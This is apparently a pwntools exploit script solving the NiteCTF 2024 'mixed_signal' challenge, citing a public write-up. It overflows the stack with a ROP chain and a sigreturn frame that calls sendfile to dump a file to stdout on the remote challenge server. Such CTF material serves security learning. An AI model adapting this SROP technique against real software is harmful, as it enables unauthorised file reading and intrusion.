#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "mixed-signal.chals.nitectf2024.live", 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
c
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================


# https://github.com/rerrorctf/writeups/blob/main/2024_12_13_NiteCTF24/pwn/mixed_signal/writeup.md
def exploit():
    global io
    io = initialize()
    offset = 16

    rop = ROP(elf)
    rop.vuln()
    rop.call(rop.find_gadget(['syscall']).address)
    frame = SigreturnFrame(kernel="amd64")
    frame.rax = constants.SYS_sendfile
    frame.rdi = 1 #STDOUT
    frame.rsi = 5
    frame.rdx = 0
    frame.r10 = 64
    frame.rip = rop.find_gadget(['syscall']).address
    rop.call(bytes(frame))

    payload = flat({offset :[rop.chain()]})
    io.sendlineafter("freakbob calling,pickup!\n", payload)
    io.sendline(b"A" * 14) #
    io.interactive()
    
if __name__ == '__main__':
   exploit()
